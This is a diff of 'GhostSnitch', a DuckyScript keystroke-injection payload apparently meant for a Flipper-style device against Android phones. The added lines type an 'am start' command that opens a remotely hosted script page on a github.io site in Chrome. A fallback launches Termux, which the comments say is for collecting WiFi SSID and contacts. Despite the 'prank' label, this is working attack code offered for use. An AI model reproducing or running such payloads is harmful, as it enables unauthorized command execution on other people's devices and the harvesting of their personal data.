@@ -1,7 +1,21 @@
 REM GhostSnitch Android Payload
 REM Author: TBJr
-REM Description: Executes hosted Android prank script via Termux
+REM Description: Executes Android prank script - works without Termux!
+REM Version: 3.0 - Universal Android support via Web APIs
+REM 
+REM This payload works on ANY Android device with Chrome (pre-installed on most)
+REM No Termux or special apps required!
 
+REM Method 1: Web-based execution (Primary - works on all Android devices)
+REM Opens Chrome and executes script using Web APIs (Web Speech API for TTS)
+GUI r
+DELAY 500
+STRING am start -a android.intent.action.VIEW -d "https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.html"
+ENTER
+DELAY 2000
+
+REM Method 2: Fallback - Try Termux if available (for enhanced features)
+REM This provides additional features like WiFi SSID and contacts if Termux API is installed
 GUI r
 DELAY 500
 STRING am start -n com.termux/.HomeActivity
